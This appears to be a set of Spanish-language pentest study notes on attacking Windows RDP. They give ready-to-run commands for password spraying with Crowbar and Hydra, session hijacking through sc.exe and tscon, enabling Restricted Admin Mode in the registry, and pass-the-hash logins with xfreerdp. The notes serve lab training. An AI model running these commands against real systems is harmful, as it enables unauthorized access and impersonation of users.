
## 1. Enumeración de RDP

**RDP (Remote Desktop Protocol)** permite conectarse remotamente a un sistema Windows mediante una interfaz gráfica.

- **Puerto por defecto:** TCP/3389.
    
- **Servicio en Nmap:** `ms-wbt-server`.
    
- **Objetivo:** comprobar si RDP está disponible y determinar si podemos acceder con credenciales válidas.
    

### Escaneo con Nmap

```
nmap -Pn -p3389 <IP>
```

Para detectar la versión y ejecutar scripts de enumeración predeterminados:

```
nmap -Pn -sC -sV -p3389 <IP>
```

## 2. Password Spraying contra RDP

Un método de ataque consiste en probar contraseñas contra una lista de usuarios.

**Password Spraying:** probar una misma contraseña contra múltiples usuarios antes de probar otra, reduciendo el riesgo de bloqueo por intentos fallidos.

> **Importante:** comprueba la política de bloqueo de cuentas antes de realizar intentos de autenticación. RDP puede rechazar conexiones demasiado frecuentes.

### Crowbar

Archivo `usernames.txt`:

```
root
test
user
guest
admin
administrator
```

Probar una contraseña contra la lista de usuarios:

```
crowbar -b rdp -s <IP>/32 -U usernames.txt -c '<PASSWORD>'
```

Ejemplo:

```
crowbar -b rdp -s 192.168.220.142/32 -U usernames.txt -c 'password123'
```

Si encuentra credenciales válidas, mostrará una salida similar a:

```
RDP-SUCCESS : <IP>:3389 - administrator:password123
```

### Hydra

También podemos utilizar Hydra:

```
hydra -L usernames.txt -p '<PASSWORD>' <IP> rdp
```

- `-L`: archivo con nombres de usuario.
    
- `-p`: contraseña que se probará.
    
- `rdp`: servicio objetivo.
    

Para reducir las conexiones paralelas y dar tiempo al servidor a recuperarse:

```
hydra -L usernames.txt -p '<PASSWORD>' -t 1 -W 3 <IP> rdp
```

**Nota:** el módulo RDP de Hydra puede ser experimental y el servicio puede tolerar mal un número elevado de conexiones simultáneas.

## 3. Conexión mediante RDP

Una vez obtenidas credenciales válidas, podemos conectarnos al sistema Windows y acceder a su escritorio.

### Con rdesktop

```
rdesktop -u <USER> -p '<PASSWORD>' <IP>
```

Ejemplo:

```
rdesktop -u administrator -p 'password123' 192.168.2.143
```

### Con xfreerdp

```
xfreerdp /v:<IP> /u:<USER> /p:'<PASSWORD>'
```

En versiones recientes de FreeRDP, el ejecutable puede llamarse `xfreerdp3`.

Si aparece un aviso de certificado autofirmado, significa que el cliente no puede verificar la confianza del certificado del servidor. En un laboratorio, comprueba que corresponde al objetivo antes de aceptar la conexión.

## 4. Secuestro de sesiones RDP (_RDP Session Hijacking_)

Si tenemos privilegios suficientes en un sistema Windows y otro usuario mantiene una sesión RDP activa, podemos intentar conectarnos a su sesión sin conocer su contraseña.

Esto puede permitirnos actuar con la identidad del usuario objetivo y, si dispone de privilegios superiores, ampliar nuestro acceso en el sistema o en el dominio.

### Paso 1. Enumerar las sesiones

En una consola de Windows:

```
query user
```

Ejemplo de salida:

```
USERNAME    SESSIONNAME    ID    STATE
juurena     rdp-tcp#13     1     Active
lewen       rdp-tcp#14     2     Active
```

En este ejemplo, `lewen` tiene el identificador de sesión `2`.

### Paso 2. Requisitos

Para ejecutar el método descrito en el módulo necesitamos:

- Privilegios de `SYSTEM`.
    
- Una sesión RDP de destino activa.
    
- El identificador de la sesión objetivo.
    
- El nombre de nuestra sesión RDP.
    

El módulo menciona PsExec y Mimikatz como herramientas que pueden utilizarse para obtener privilegios de `SYSTEM` cuando se dispone de privilegios de administrador local.

### Paso 3. Crear un servicio con `sc.exe`

El ejemplo del módulo crea un servicio que ejecuta `tscon.exe` para conectar la sesión objetivo con la sesión RDP actual:

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<OUR_SESSION_NAME>"
```

Ejemplo del módulo:

```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

Si el servicio se crea correctamente, aparecerá:

```
[SC] CreateService SUCCESS
```

### Paso 4. Ejecutar el servicio

```
net start sessionhijack
```

Si se cumplen los requisitos y el método funciona en ese sistema, se abrirá una terminal asociada a la sesión del usuario objetivo.

**Limitación indicada en el módulo:** este método ya no funciona en Windows Server 2019.

## 5. RDP Pass-the-Hash (PtH)

El ataque **Pass-the-Hash** permite intentar autenticarse utilizando un hash NTLM en lugar de conocer la contraseña en texto plano.

Puede ser útil si hemos obtenido el hash durante un volcado de credenciales y queremos acceder mediante la interfaz gráfica de Windows.

### Requisitos y limitaciones

- Disponer del hash NT del usuario.
    
- Que el usuario tenga permiso para iniciar sesión mediante RDP en el sistema objetivo.
    
- Que el sistema admita el método de autenticación utilizado.
    
- Tener habilitado el modo de administración restringida (_Restricted Admin Mode_) en el equipo objetivo, según el procedimiento descrito en el módulo.
    

No todos los sistemas Windows permiten realizar este ataque.

### Paso 1. Habilitar Restricted Admin Mode

El módulo muestra la siguiente modificación del registro, ejecutada en el equipo Windows objetivo:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Esta modificación requiere los privilegios necesarios para escribir en esa clave del registro.

### Paso 2. Conectarse utilizando el hash NTLM

Desde Linux, con FreeRDP:

```
xfreerdp /v:<IP> /u:<USER> /pth:<NT_HASH>
```

Ejemplo del módulo:

```
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

Si la autenticación funciona, accederemos mediante RDP con la identidad del usuario objetivo sin necesitar su contraseña en texto plano.

## 7. Flujo de trabajo para un laboratorio

1. **Enumerar:** comprobar si TCP/3389 está abierto.
    
2. **Identificar usuarios:** recopilar nombres de usuario mediante las técnicas de enumeración disponibles en el entorno.
    
3. **Comprobar credenciales:** utilizar credenciales encontradas o realizar pruebas controladas de password spraying.
    
4. **Acceder:** conectarse mediante `xfreerdp` o `rdesktop`.
    
5. **Enumerar sesiones:** si tenemos acceso a Windows, ejecutar `query user`.
    
6. **Evaluar privilegios:** determinar si podemos acceder a otras sesiones o si disponemos de un hash NTLM que permita probar Pass-the-Hash.
    
7. **Validar limitaciones:** comprobar la versión de Windows, los permisos de la cuenta y los requisitos específicos de cada técnica.
